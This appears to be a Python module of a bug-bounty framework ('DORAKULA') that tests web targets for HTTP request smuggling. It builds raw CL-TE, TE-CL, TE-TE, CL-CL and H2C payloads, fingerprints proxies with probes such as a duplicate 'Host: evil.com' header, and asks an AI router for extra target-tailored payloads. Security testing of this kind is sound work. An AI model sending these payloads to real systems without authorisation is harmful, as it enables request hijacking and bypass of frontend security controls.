"""
DORAKULA - HTTP Smuggling Tester Module
========================================
Advanced HTTP request smuggling detection for bug bounty.
Uses raw socket/asyncio for precise HTTP request construction
and timing-based detection for blind smuggling scenarios.

Author: DORAKULA Framework
"""

import asyncio
import logging
import socket
import ssl
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

logger = logging.getLogger("dorakula.http_smuggling")


class HTTPSmugglingTester:
    """Detects HTTP request smuggling vulnerabilities including CL-TE,
    TE-CL, TE-TE obfuscation, HTTP/2 smuggling, and H2C upgrade smuggling.

    Uses raw socket connections for precise control over HTTP request
    construction, enabling detection of desync vulnerabilities between
    frontend and backend servers.
    """

    def __init__(self, ai_router: Optional[Any] = None, timeout: int = 10) -> None:
        """Initialize the HTTPSmugglingTester.

        Args:
            ai_router: AI router instance for enhanced analysis.
            timeout: Socket timeout in seconds.
        """
        self.ai_router = ai_router
        self.timeout = timeout
        logger.info("HTTPSmugglingTester initialized with timeout=%d", timeout)

    async def _send_raw(
        self,
        host: str,
        port: int,
        payload: bytes,
        use_ssl: bool = True,
    ) -> Tuple[bytes, float]:
        """Send raw bytes over a socket and return the response with timing.

        Args:
            host: Target hostname.
            port: Target port.
            payload: Raw bytes to send.
            use_ssl: Whether to use SSL/TLS.

        Returns:
            Tuple of (response_bytes, elapsed_time_seconds).
        """
        start = time.monotonic()
        try:
            reader: Optional[asyncio.StreamReader] = None
            writer: Optional[asyncio.StreamWriter] = None

            if use_ssl:
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ssl_ctx),
                    timeout=self.timeout,
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port),
                    timeout=self.timeout,
                )

            writer.write(payload)
            await writer.drain()

            response = b""
            try:
                while True:
                    chunk = await asyncio.wait_for(
                        reader.read(4096), timeout=self.timeout
                    )
                    if not chunk:
                        break
                    response += chunk
            except asyncio.TimeoutError:
                pass

            elapsed = time.monotonic() - start
            writer.close()
            try:
                await writer.wait_closed()
            except (ConnectionError, OSError):
                pass

            return response, elapsed

        except (ConnectionError, OSError, asyncio.TimeoutError) as exc:
            elapsed = time.monotonic() - start
            logger.warning("Raw socket send to %s:%d failed: %s", host, port, exc)
            return b"", elapsed

    def _parse_target(self, target: str) -> Tuple[str, int, bool]:
        """Parse target URL into host, port, and SSL flag.

        Args:
            target: Target URL string.

        Returns:
            Tuple of (host, port, use_ssl).
        """
        parsed = urlparse(target)
        host = parsed.hostname or "localhost"
        use_ssl = parsed.scheme == "https"
        port = parsed.port or (443 if use_ssl else 80)
        return host, port, use_ssl

    async def _ai_analyze(self, analysis: Dict[str, Any], context: str) -> Dict[str, Any]:
        """Use AI router to analyze smuggling test results.

        Args:
            analysis: Raw analysis results.
            context: Test type context string.

        Returns:
            AI-enhanced analysis dictionary.
        """
        if self.ai_router is None:
            analysis["ai_analysis"] = "AI router not configured"
            analysis["confidence"] = 0.5
            return analysis

        try:
            prompt = (
                f"Analyze this HTTP smuggling test result for '{context}'. "
                f"Determine if it indicates a true desync vulnerability. "
                f"Rate confidence 0.0-1.0. Results: {analysis}"
            )
            ai_result = await self.ai_router.analyze(prompt)
            analysis["ai_analysis"] = ai_result.get("summary", "")
            analysis["confidence"] = ai_result.get("confidence", 0.5)
        except (ConnectionError, TimeoutError, ValueError) as exc:
            logger.warning("AI analysis failed: %s", exc)
            analysis["ai_analysis"] = f"AI analysis error: {exc}"
            analysis["confidence"] = 0.5

        return analysis

    async def test_cl_te(self, target: str) -> Dict[str, Any]:
        """Test for CL-TE smuggling (Content-Length vs Transfer-Encoding).

        The frontend processes Content-Length, the backend processes
        Transfer-Encoding: chunked, allowing request smuggling.

        Args:
            target: Target URL to test.

        Returns:
            Dictionary with CL-TE test results.
        """
        host, port, use_ssl = self._parse_target(target)
        logger.info("Testing CL-TE smuggling on %s", target)

        # CL-TE smuggle payload: frontend sees Content-Length, backend sees chunked
        smuggle_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 13\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"SMUGGLED"
        ).encode()

        # Normal request for baseline timing
        normal_payload = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        try:
            normal_response, normal_time = await self._send_raw(
                host, port, normal_payload, use_ssl
            )
            smuggle_response, smuggle_time = await self._send_raw(
                host, port, smuggle_payload, use_ssl
            )

            # Detect smuggling by checking for timing anomalies or unexpected responses
            timing_diff = abs(smuggle_time - normal_time)
            normal_status = normal_response.split(b"\r\n")[0] if normal_response else b""
            smuggle_status = smuggle_response.split(b"\r\n")[0] if smuggle_response else b""

            # Check for signs of smuggling: 400/403 on smuggled, timing differences
            has_smuggle_indicators = (
                b"400" in smuggle_status
                or b"403" in smuggle_status
                or timing_diff > 2.0
                or b"SMUGGLED" in smuggle_response
            )

            analysis = {
                "test_type": "CL-TE",
                "target": target,
                "normal_status": normal_status.decode(errors="replace"),
                "smuggle_status": smuggle_status.decode(errors="replace"),
                "timing_difference": round(timing_diff, 3),
                "timing_anomaly": timing_diff > 2.0,
                "smuggle_indicators_found": has_smuggle_indicators,
                "response_length_diff": abs(
                    len(smuggle_response) - len(normal_response)
                ),
                "potential_vulnerability": has_smuggle_indicators,
            }
            analysis = await self._ai_analyze(analysis, "CL-TE_smuggling")
            return analysis

        except (ConnectionError, OSError) as exc:
            logger.error("CL-TE test failed: %s", exc)
            return {"error": str(exc), "vulnerable": False}

    async def test_te_cl(self, target: str) -> Dict[str, Any]:
        """Test for TE-CL smuggling (Transfer-Encoding vs Content-Length).

        The frontend processes Transfer-Encoding: chunked, the backend
        processes Content-Length, allowing request smuggling.

        Args:
            target: Target URL to test.

        Returns:
            Dictionary with TE-CL test results.
        """
        host, port, use_ssl = self._parse_target(target)
        logger.info("Testing TE-CL smuggling on %s", target)

        # TE-CL smuggle payload: frontend processes chunked, backend uses CL
        body = "0\r\n\r\nSMUGGLED"
        smuggle_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"G\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode() + body.encode()

        normal_payload = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        try:
            normal_response, normal_time = await self._send_raw(
                host, port, normal_payload, use_ssl
            )
            smuggle_response, smuggle_time = await self._send_raw(
                host, port, smuggle_payload, use_ssl
            )

            timing_diff = abs(smuggle_time - normal_time)
            normal_status = normal_response.split(b"\r\n")[0] if normal_response else b""
            smuggle_status = smuggle_response.split(b"\r\n")[0] if smuggle_response else b""

            has_smuggle_indicators = (
                b"400" in smuggle_status
                or b"403" in smuggle_status
                or timing_diff > 2.0
                or b"SMUGGLED" in smuggle_response
            )

            analysis = {
                "test_type": "TE-CL",
                "target": target,
                "normal_status": normal_status.decode(errors="replace"),
                "smuggle_status": smuggle_status.decode(errors="replace"),
                "timing_difference": round(timing_diff, 3),
                "timing_anomaly": timing_diff > 2.0,
                "smuggle_indicators_found": has_smuggle_indicators,
                "potential_vulnerability": has_smuggle_indicators,
            }
            analysis = await self._ai_analyze(analysis, "TE-CL_smuggling")
            return analysis

        except (ConnectionError, OSError) as exc:
            logger.error("TE-CL test failed: %s", exc)
            return {"error": str(exc), "vulnerable": False}

    async def test_te_te(self, target: str) -> Dict[str, Any]:
        """Test for TE-TE obfuscation smuggling (Double Transfer-Encoding).

        Sends a request with two Transfer-Encoding headers where the first
        is obfuscated. If the frontend strips the obfuscated header and
        processes the second while the backend does the opposite, smuggling
        is possible.

        Args:
            target: Target URL to test.

        Returns:
            Dictionary with TE-TE test results.
        """
        host, port, use_ssl = self._parse_target(target)
        logger.info("Testing TE-TE obfuscation smuggling on %s", target)

        # Obfuscation variations for Transfer-Encoding
        obfuscations = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: chunked\r\n Transfer-Encoding: x",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding: chunked\x00",
        ]

        results: List[Dict[str, Any]] = []
        normal_payload = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        try:
            normal_response, normal_time = await self._send_raw(
                host, port, normal_payload, use_ssl
            )

            for obfuscation in obfuscations:
                payload = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Length: 4\r\n"
                    f"{obfuscation}\r\n"
                    f"\r\n"
                    f"1\r\n"
                    f"Z\r\n"
                    f"0\r\n"
                    f"\r\n"
                ).encode()

                response, elapsed = await self._send_raw(
                    host, port, payload, use_ssl
                )
                timing_diff = abs(elapsed - normal_time)
                status = response.split(b"\r\n")[0] if response else b""

                results.append({
                    "obfuscation": obfuscation,
                    "status": status.decode(errors="replace"),
                    "timing_diff": round(timing_diff, 3),
                    "timing_anomaly": timing_diff > 2.0,
                    "response_length": len(response),
                })

            anomalies = [r for r in results if r["timing_anomaly"]]
            analysis = {
                "test_type": "TE-TE",
                "target": target,
                "obfuscation_results": results,
                "anomalies_found": len(anomalies),
                "potential_vulnerability": len(anomalies) > 0,
            }
            analysis = await self._ai_analyze(analysis, "TE-TE_smuggling")
            return analysis

        except (ConnectionError, OSError) as exc:
            logger.error("TE-TE test failed: %s", exc)
            return {"error": str(exc), "vulnerable": False}

    async def test_h2_smuggling(self, target: str) -> Dict[str, Any]:
        """Test for HTTP/2 smuggling via H2 downgrading.

        Tests whether the frontend accepts HTTP/2 but downgrades
        to HTTP/1.1 for the backend, potentially allowing smuggling
        through h2c conversation.

        Args:
            target: Target URL to test.

        Returns:
            Dictionary with H2 smuggling test results.
        """
        host, port, use_ssl = self._parse_target(target)
        logger.info("Testing HTTP/2 smuggling on %s", target)

        try:
            # Test if target supports HTTP/2
            supports_h2 = False
            if use_ssl:
                try:
                    ssl_ctx = ssl.create_default_context()
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE
                    ssl_ctx.set_alpn_protocols(["h2", "http/1.1"])

                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port, ssl=ssl_ctx),
                        timeout=self.timeout,
                    )
                    negotiated = writer.get_extra_info("ssl_object")
                    if negotiated:
                        alpn = negotiated.selected_alpn_protocol()
                        supports_h2 = alpn == "h2"
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except (ConnectionError, OSError):
                        pass
                except (ConnectionError, OSError, asyncio.TimeoutError) as exc:
                    logger.warning("H2 ALPN negotiation failed: %s", exc)

            # Test H2 smuggling via connection-level headers
            h2_smuggle_payloads = [
                # Attempt to inject HTTP/1.1 style headers in H2 context
                (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Connection: close\r\n"
                    f"Content-Length: 0\r\n"
                    f"\r\n"
                ).encode(),
            ]

            results: List[Dict[str, Any]] = []
            for payload in h2_smuggle_payloads:
                response, elapsed = await self._send_raw(
                    host, port, payload, use_ssl
                )
                status = response.split(b"\r\n")[0] if response else b""
                results.append({
                    "status": status.decode(errors="replace"),
                    "response_length": len(response),
                    "elapsed": round(elapsed, 3),
                })

            analysis = {
                "test_type": "H2_smuggling",
                "target": target,
                "supports_h2": supports_h2,
                "results": results,
                "potential_vulnerability": supports_h2 and len(results) > 0,
            }
            analysis = await self._ai_analyze(analysis, "H2_smuggling")
            return analysis

        except (ConnectionError, OSError) as exc:
            logger.error("H2 smuggling test failed: %s", exc)
            return {"error": str(exc), "vulnerable": False}

    async def test_h2c_smuggling(self, target: str) -> Dict[str, Any]:
        """Test for H2C (HTTP/2 Cleartext) upgrade smuggling.

        Tests whether the server allows an HTTP/1.1 to HTTP/2 upgrade
        that can be exploited to bypass frontend proxy controls.

        Args:
            target: Target URL to test.

        Returns:
            Dictionary with H2C smuggling test results.
        """
        host, port, use_ssl = self._parse_target(target)
        logger.info("Testing H2C upgrade smuggling on %s", target)

        # H2C upgrade request
        h2c_payload = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"\r\n"
        ).encode()

        normal_payload = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        try:
            normal_response, normal_time = await self._send_raw(
                host, port, normal_payload, use_ssl
            )
            h2c_response, h2c_time = await self._send_raw(
                host, port, h2c_payload, use_ssl
            )

            h2c_status = h2c_response.split(b"\r\n")[0] if h2c_response else b""
            supports_upgrade = b"101" in h2c_status

            # If upgrade is supported, try smuggling through the upgraded connection
            smuggle_via_h2c = False
            if supports_upgrade:
                # Send a second request after upgrade to test desync
                second_payload = (
                    f"GET /smuggled HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                ).encode()
                second_response, _ = await self._send_raw(
                    host, port, h2c_payload + second_payload, use_ssl
                )
                if b"smuggled" in second_response or len(second_response) != len(h2c_response):
                    smuggle_via_h2c = True

            analysis = {
                "test_type": "H2C_smuggling",
                "target": target,
                "h2c_status": h2c_status.decode(errors="replace"),
                "supports_upgrade": supports_upgrade,
                "smuggle_via_h2c": smuggle_via_h2c,
                "potential_vulnerability": supports_upgrade or smuggle_via_h2c,
            }
            analysis = await self._ai_analyze(analysis, "H2C_smuggling")
            return analysis

        except (ConnectionError, OSError) as exc:
            logger.error("H2C smuggling test failed: %s", exc)
            return {"error": str(exc), "vulnerable": False}

    async def detect_frontend_backend(self, target: str) -> Dict[str, Any]:
        """Fingerprint frontend and backend servers to detect desync surface.

        Uses various techniques to identify if a reverse proxy/CDN sits
        in front of the backend, and what servers are in use.

        Args:
            target: Target URL to fingerprint.

        Returns:
            Dictionary with frontend/backend fingerprint data.
        """
        host, port, use_ssl = self._parse_target(target)
        logger.info("Fingerprinting frontend/backend on %s", target)

        try:
            # Send requests with varying headers to detect server behavior
            probe_payloads: List[Tuple[str, bytes]] = [
                (
                    "normal",
                    (
                        f"GET / HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    ).encode(),
                ),
                (
                    "invalid_method",
                    (
                        f"SMUGGLE / HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    ).encode(),
                ),
                (
                    "double_host",
                    (
                        f"GET / HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Host: evil.com\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    ).encode(),
                ),
                (
                    "absolute_uri",
                    (
                        f"GET http://{host}/ HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    ).encode(),
                ),
            ]

            results: Dict[str, Any] = {}
            server_headers: List[str] = []
            via_headers: List[str] = []
            x_powered_by: List[str] = []

            for name, payload in probe_payloads:
                response, elapsed = await self._send_raw(
                    host, port, payload, use_ssl
                )
                status = response.split(b"\r\n")[0] if response else b""
                response_text = response.decode(errors="replace")

                # Extract headers
                header_section = response_text.split("\r\n\r\n")[0] if "\r\n\r\n" in response_text else ""
                for line in header_section.split("\r\n"):
                    lower_line = line.lower()
                    if lower_line.startswith("server:"):
                        server_headers.append(line.split(":", 1)[1].strip())
                    elif lower_line.startswith("via:"):
                        via_headers.append(line.split(":", 1)[1].strip())
                    elif lower_line.startswith("x-powered-by:"):
                        x_powered_by.append(line.split(":", 1)[1].strip())

                results[name] = {
                    "status": status.decode(errors="replace"),
                    "elapsed": round(elapsed, 3),
                    "response_length": len(response),
                }

            # Deduplicate
            unique_servers = list(set(server_headers))
            unique_via = list(set(via_headers))
            unique_xpb = list(set(x_powered_by))

            # If multiple Server headers differ, frontend != backend
            frontend_different = len(unique_servers) > 1

            analysis = {
                "target": target,
                "server_headers": unique_servers,
                "via_headers": unique_via,
                "x_powered_by": unique_xpb,
                "frontend_different_from_backend": frontend_different,
                "has_reverse_proxy": len(unique_via) > 0,
                "probe_results": results,
                "desync_surface": frontend_different or len(unique_via) > 0,
            }
            analysis = await self._ai_analyze(analysis, "frontend_backend_fingerprint")
            return analysis

        except (ConnectionError, OSError) as exc:
            logger.error("Frontend/backend detection failed: %s", exc)
            return {"error": str(exc), "vulnerable": False}

    async def generate_smuggling_payloads(self, target: str) -> Dict[str, Any]:
        """Generate AI-enhanced smuggling payloads tailored to the target.

        First fingerprints the target, then generates context-aware payloads.

        Args:
            target: Target URL to generate payloads for.

        Returns:
            Dictionary with generated payloads and rationale.
        """
        logger.info("Generating smuggling payloads for %s", target)

        try:
            # First fingerprint the target
            fingerprint = await self.detect_frontend_backend(target)

            # Base payloads for known server combinations
            host, port, _ = self._parse_target(target)
            base_payloads: List[Dict[str, str]] = [
                {
                    "name": "CL-TE_basic",
                    "description": "Basic CL-TE smuggling",
                    "payload": (
                        f"POST / HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Content-Length: 13\r\n"
                        f"Transfer-Encoding: chunked\r\n"
                        f"\r\n"
                        f"0\r\n"
                        f"\r\n"
                        f"SMUGGLED"
                    ),
                },
                {
                    "name": "TE-CL_basic",
                    "description": "Basic TE-CL smuggling",
                    "payload": (
                        f"POST / HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Content-Length: 3\r\n"
                        f"Transfer-Encoding: chunked\r\n"
                        f"\r\n"
                        f"1\r\n"
                        f"G\r\n"
                        f"0\r\n"
                        f"\r\n"
                    ),
                },
                {
                    "name": "TE-TE_obfuscation",
                    "description": "Double TE with obfuscation",
                    "payload": (
                        f"POST / HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Content-Length: 4\r\n"
                        f"Transfer-Encoding: chunked\r\n"
                        f"Transfer-Encoding: x\r\n"
                        f"\r\n"
                        f"1\r\n"
                        f"Z\r\n"
                        f"0\r\n"
                        f"\r\n"
                    ),
                },
                {
                    "name": "CL-CL_desync",
                    "description": "Double Content-Length desync",
                    "payload": (
                        f"POST / HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Content-Length: 0\r\n"
                        f"Content-Length: 44\r\n"
                        f"\r\n"
                        f"GET /smuggled HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"\r\n"
                    ),
                },
                {
                    "name": "H2C_upgrade",
                    "description": "H2C upgrade smuggling",
                    "payload": (
                        f"GET / HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Upgrade: h2c\r\n"
                        f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
                        f"Connection: Upgrade, HTTP2-Settings\r\n"
                        f"\r\n"
                    ),
                },
            ]

            # AI-enhanced payload generation
            if self.ai_router is not None:
                try:
                    prompt = (
                        f"Based on this server fingerprint: {fingerprint}, "
                        f"generate additional HTTP request smuggling payloads "
                        f"specific to the detected server combination. "
                        f"Return as a list of named payloads."
                    )
                    ai_payloads = await self.ai_router.analyze(prompt)
                    if isinstance(ai_payloads, dict) and "payloads" in ai_payloads:
                        base_payloads.extend(ai_payloads["payloads"])
                except (ConnectionError, TimeoutError, ValueError) as exc:
                    logger.warning("AI payload generation failed: %s", exc)

            analysis = {
                "target": target,
                "fingerprint": fingerprint,
                "payloads": base_payloads,
                "total_payloads": len(base_payloads),
            }
            return analysis

        except (ConnectionError, OSError) as exc:
            logger.error("Payload generation failed: %s", exc)
            return {"error": str(exc), "payloads": []}
